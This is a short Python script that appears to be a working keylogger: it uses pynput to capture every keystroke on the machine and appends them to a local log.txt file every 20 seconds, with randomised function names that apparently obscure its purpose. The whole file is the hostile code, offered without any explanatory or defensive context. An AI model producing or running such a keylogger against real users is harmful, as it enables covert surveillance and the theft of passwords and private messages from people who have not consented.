from pynput import keyboard
import threading,pickle

log = ""

def juv756(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:    
            log += " " + str(key) + " "
            
def gtbre5():
    global log
    with open("log.txt","a") as f:
        f.write("\n" + log)
    log = ""
    timer = threading.Timer(20, gtbre5)
    timer.start()
    
with keyboard.Listener(on_press=juv756) as logg:
    gtbre5()
    logg.join()
